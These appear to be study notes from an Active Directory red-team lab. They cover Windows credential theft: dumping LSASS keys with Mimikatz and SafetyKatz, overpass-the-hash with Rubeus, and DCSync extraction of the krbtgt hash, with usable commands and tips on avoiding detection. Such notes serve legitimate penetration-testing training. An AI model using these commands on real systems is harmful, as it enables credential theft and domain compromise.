- Local Security Authority (LSA) is responsible for authentication on a Windows machine. Local Security Authority Subsystem Service (LSASS) is its service.
- LSASS stores credentials in multiple forms - NT hash, AES, Kerberos tickets and so on.
- Credentials are stored by LSASS when a user:
	- Logs on to a local session or RDP
	- Uses RunAs
	- Run a Windows service
	- Runs a scheduled task or batch job
	- Uses a Remote Administration tool
- The LSASS process is therefore a very attractive target.
- It is also the most monitored process on a Windows machine.
- **Look for LSASS only as last resort**
- Some of the credentials that can be extracted without touching LSASS
	- SAM hive (Registry) - Local credentials
	- LSA Secrets/SECURITY hive (Registry) - Service account passwords, Domain cached credentials etc.
	- DPAPI Protected Credentials (Disk) - Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens etc.

### Mimikatz
- mimikatz can be used to extract credentials, tickets, replay credentials, play with AD security and many more interesting attacks!
- It is one of the most widely known red team tool and is therefore heavily fingerprinted.
- There are multiple tools that implement mimikatz full or partial mimikatz features.
- Dump credentials on a using Mimikatz.
```
mimikatz.exe -Command '"sekurlsa::ekeys"'
```
- Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
```
SafetyKatz.exe "sekurlsa::ekeys"
```
- From a Linux attacking machine using impacket.

### OverPass-The-Hash
- try not use RC4 (i.e., NTLM hash) hash if you have AES256 key
- Using credential to request for the ticket
- Over Pass the Hash is used to access service on domain joined machine and Pass the Hash is for local user
- Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256keys> /run:powershell.exe"'
```

```
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
```
- The above commands starts a process with a logon type 9 (same as runas /netonly).
- Over Pass the hash (OPTH) generate tokens from hashes or keys.
- Below doesn't need elevation
```
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```
- Below command needs elevation
```
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### DCSync
- To extract credentials from the DC without code execution on it, we can use DCSync.
- To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for dcorp domain:
```
Invoke-mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

```
SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
- By default, Domain Admins, Enterprise Admins or Domain Controller privileges are required to run DCSync.